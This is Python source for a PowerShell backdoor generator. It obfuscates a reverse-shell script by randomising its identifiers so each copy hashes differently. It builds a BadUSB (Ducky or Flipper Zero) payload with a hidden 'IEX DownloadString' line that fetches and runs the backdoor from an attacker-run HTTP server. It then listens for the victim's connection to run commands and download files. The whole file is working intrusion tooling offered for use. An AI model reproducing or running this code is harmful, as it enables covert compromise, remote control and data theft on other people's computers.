import os
import socket
import argparse
from core.utils import *

BLOCKSIZE = 65536
READ_AMOUNT = 50*1024
CWD = os.getcwd()

TEMPLATE_DIR = CWD + "/templates/"

BACKDOOR_TEMPLATE = TEMPLATE_DIR + "template.ps1"
SERVER_BACKDOOR_TEMPLATE = TEMPLATE_DIR + "server-payload.txt"

# This is used for generating a new name for each 
# variable and function in the powershell script. 
# The script is then base64 encoded ensuring a unique hash
POWERSHELL_SCRIPT_OBJECTS: list = [
    "UserDefinedIPAddress",
    "UserDefinedPort",
    "activeClient",
    "activeStream",
    "textBuffer",
    "textEncoding",
    "sessionWriter",
    "sessionReader",
    "createBackdoorConnection",
    "handleActiveClient",
    "writeToStream",
    "currentUser",
    "computerName",
    "pwd",
    "prompt",
    "rawResponse",
    "response",
    "output",
    "content",
    "readCount"
]

class Backdoor:
    def __init__(self, **kwargs) -> None:
        """ Creates the backdoor
        :param ip_address: Ip address to host the backdoor on
        :param port: Port to attach the backdoor too
        :param verbose: If true verbose printing is enabled
        :param out_file: File location to store backdoor.ps1
        """
        self.pre_actions = []
        self.ip_address: str = kwargs.get("ip_address")
        self.port: int = kwargs.get("port")
        self.ip_tuple: tuple = (self.ip_address, self.port)
        self.verbose: bool = kwargs.get("verbose")
        self.out_file: str = kwargs.get("out")
        self.ip_address: str = kwargs.get("ip_address")
        self.delay: int = kwargs.get("delay")
        self.server_port: int = kwargs.get("server_port")
        self.server_ip_tuple: tuple = (self.ip_address, self.server_port)
        self.server: bool = kwargs.get("server")
        self.type: bool = kwargs.get("type")
        self.keyboard_layout: str = kwargs.get("keyboard")
        self.flipper: str = kwargs.get("flipper")
        self.ducky: str = kwargs.get("ducky")
        if kwargs.get("random"):
            self.out_file: str = f"{generate_string(8)}.ps1"
        self.sock: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    def create_payload(self) -> bool:
        """
        Creates a Bad Usb/Ducky script payload
        :return: True if the file was created
        """
        template_server_payload: str = get_file_content(SERVER_BACKDOOR_TEMPLATE)
        template_server_payload = template_server_payload.replace("START_DELAY_TIME", str(self.delay))
        powershell_line = f"STRING powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('http://{self.ip_address}:{self.server_port}/{self.out_file}')"
        template_server_payload = template_server_payload.replace("POWERSHELL_LINE", powershell_line)
        return self.save_content_to_file(template_server_payload, "payload.txt")

    def handle_bad_usb(self) -> None:
        """ Creates ducky script if needed
        """
        if not self.create_payload():
            self.print_verbose_message(f"Failed to create payload.txt", prefix="-")
            return
        self.print_verbose_message(f"Created payload.txt", prefix="*")
        if self.server:
            self.start_threaded_http_server()
            print(f"[*] Started HTTP server hosting file: http://{self.ip_address}:{self.server_port}/{self.out_file}")
        if self.ducky:
            self.print_verbose_message("Encoding payload.txt into inject.bin")
            if not self.encode_payload():
                self.print_verbose_message("Failed to encode payload.txt into inject.bin", prefix="-")
        if self.flipper:
            make_unix_here(SERVER_BACKDOOR_TEMPLATE, CWD + f"/{self.flipper}")

    def create_backdoor(self):
        """ Creates the backdoor file
        """
        try:
            if not self.obfuscate_backdoor():
                self.print_verbose_message("Failed to encode backdoor", prefix="-")
                self.stop()
            hash = get_sha1_file_hash(self.out_file)
            self.print_verbose_message(f"Saved backdoor {self.out_file} sha1:{hash}")
            if self.flipper or self.ducky:
                self.handle_bad_usb()
            print(f"[*] Starting Backdoor Listener {self.ip_address}:{self.port} use CTRL+BREAK to stop")

        except OSError as e:
            exit(f"[-] Failed to bind port {self.ip_address}:{self.port} with error: {e}")

    def start_threaded_http_server(self) -> None:
        """ Creates a thread for a HTTP server hosting our current working directory     
        """
        self.httpd = socketserver.TCPServer(self.server_ip_tuple, SimpleHTTPRequestHandler)
        thread = Thread(target=self.httpd.serve_forever)
        thread.daemon = True
        thread.start()

    def start_session(self):
        """ Creates the listener
        """
        self.sock.bind(self.ip_tuple)
        while True:
            self.sock.listen(1)
            connection, address = self.sock.accept()
            self.print_verbose_message(f"Recieved connection from {address[0]}:{address[1]}")
            self.handle_client(connection)

    def obfuscate_backdoor(self) -> bool:
        """ obfuscates the backdoor source template.ps1
        :return: True if the backdoor was obfuscated
        """
        self.print_verbose_message(f"Encoding backdoor script")
        backdoor = get_file_content(BACKDOOR_TEMPLATE)
        if not backdoor:
            return False
        for powershell_object in POWERSHELL_SCRIPT_OBJECTS:
            backdoor = obfuscate(backdoor, powershell_object)

        backdoor = backdoor.replace("4444", str(self.port))
        backdoor = backdoor.replace("0.0.0.0", self.ip_address)
        return self.save_content_to_file(backdoor, self.out_file)


    def handle_client(self, connection):
        """ Handles an active backdoor session
        :param connection: Active backdoor session
        """
        print("[*] Connected, press [enter] to start the session")
        while True:
            prompt = format_string(connection.recv(READ_AMOUNT))
            if not prompt or len(prompt) == 0:
                continue

            command = input(f"{prompt}")

            if len(command) == 0:
                command += "ls | Out-Null"

            connection.sendto(command.encode(), self.ip_tuple)
            if "get_file" in command and "--help" not in command:
                self.download_remote_file(command, connection)
                continue
            print(format_string(self.recvall(connection)))


    def download_remote_file(self, command , connection):
        """ Downloads a remote file from a backdoor session
        :param command: Command to read the file location from
        :param connection: Active backdoor session
        """
        command = command.split(" ")
        try:
            file_location = command[2]
        except KeyError:
            print("Downloads a remote file and saves it to your local computer \nsyntax: get_file <remote_path> <local_path>\nPlease use absolute paths!")
            return False
        data = self.recvall(connection)
        if self.save_content_to_file(data, file_location):
            self.print_verbose_message(f"Saved content {len(data)} to {file_location}")
        return True

    def recvall(self, connection):
        """ Receives all data in a socket connection
        :param connection: Connection to read data from
        :param data: Previous data parts
        """
        data: bytes = b""
        while True:
            part = connection.recv(READ_AMOUNT)
            # print(len(part))
            data += part
            if len(part) < READ_AMOUNT:
                # either 0 or end of data
                break
        return data

    def print_verbose_message(self, message: str, prefix: str = "*"):
        """ Prints a verbose message
        :param message: Message to print
        :param prefix: Prefix to add before message e.g - == [-] Message
        """
        if self.verbose:
            if prefix:
                prefix = f"[{prefix}] "
            print(prefix + message)

    def save_content_to_file(self, content: str, filename: str):
        """ Saves content to a local file
        :param content: Bytes to save to file 
        :param filename: Filename to save data to
        """
        try:
            if "Cannot find path '" in format_string(content):
                self.print_verbose_message(f"Error: {content} ", prefix="-")
                return False
            with open(filename, "w") as f:
                f.seek(0)
                f.write(content)
            return True
        except EnvironmentError:
            self.print_verbose_message(f"Failed to create file ({len(content)}): {filename} ", prefix="-")
            return False

    def encode_payload(self) -> bool:
        """ Encodes the payload.txt into inject.bin
        1. Requires java
        2. Requires encode.jar
        """
        output = get_output(["java", "-jar", f"{CWD}/encoder.jar", "-i", f"{CWD}/payload.txt", "-o", "inject.bin", "-l", self.keyboard_layout])
        return "DuckyScript Complete" in output.decode()

    def stop(self):
        """ Stops the TCP listener and ducky-server if started
        """
        self.sock.shutdown(0)

    def start(self) -> None:
        self.create_backdoor()
        self.start_session()

def main(args) -> None:
    """ Creates a backdoor
    """
    try:
        l = Backdoor(**vars(args))
        l.start()
    except KeyboardInterrupt:
        print("1")
        l.stop()
        exit("[*] Backdoor: CTRL+C Detected exiting!")
    except ConnectionResetError as e:
        l.stop()
        exit(f"Exiting! {e}")

if __name__ ==  "__main__":
    parser = argparse.ArgumentParser(description="Powershell Backdoor Generator")
    parser.add_argument(
        "--ip-address",
        "-i",
        help=f"IP Address to bind the backdoor too (default: {get_ip_address()})", 
        default=get_ip_address(),
    )
    parser.add_argument(
        "--port",
        "-p",
        help=f"Port for the backdoor to connect over (default: 4444)", 
        default=4444,
        type=int
    )
    parser.add_argument(
        "--random",
        "-r",
        help=f"Randomizes the outputed backdoor's file name", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "--out",
        "-o",
        help=f"Specify the backdoor filename (relative file names)", 
        default="backdoor.ps1",
    )
    parser.add_argument(
        "--verbose",
         "-v",
        help=f"Show verbose output", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "--delay",
        help=f"Delay in milliseconds before Flipper Zero/Ducky-Script payload execution (default:100)", 
        default=100,
    )
    parser.add_argument(
        "--server",
        help=f"Hosts the backdoor locally over HTTP on your computer. The ducky-script or Bad Usb will fetch and run the hosted backdoor", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "--flipper",
        help=f"Payload file for flipper zero to connect to the http server (includes EOL conversion) (relative file name)", 
    )
    parser.add_argument(
        "--ducky",
        help=f"Creates an inject.bin for the http server", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "--server-port",
        help=f"Port to run the HTTP server on (--server) (default: 8989)", 
        default=8989,
    )
    parser.add_argument(
        "-k",
        "--keyboard",
        help=f"Keyboard layout for Bad Usb/Flipper Zero (default: us)", 
        default="us",
    )
    args = parser.parse_args()
    main(args)